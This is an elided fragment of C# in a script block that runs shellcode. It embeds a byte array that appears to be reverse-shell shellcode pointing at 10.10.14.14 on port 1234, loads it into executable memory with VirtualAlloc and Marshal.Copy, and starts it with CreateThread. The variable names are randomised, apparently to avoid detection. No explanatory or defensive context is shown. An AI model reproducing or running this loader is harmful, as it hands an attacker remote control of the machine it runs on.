...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x0e,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr z5BqbYX = VirtualAlloc(IntPtr.Zero,(UIntPtr)bOwQ.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(bOwQ,0,z5BqbYX,bOwQ.Length);
        IntPtr hDqISU4 = IntPtr.Zero;
        IntPtr bdNW_fT = CreateThread(IntPtr.Zero,UIntPtr.Zero,z5BqbYX,IntPtr.Zero,0,ref hDqISU4);
    }
</script>
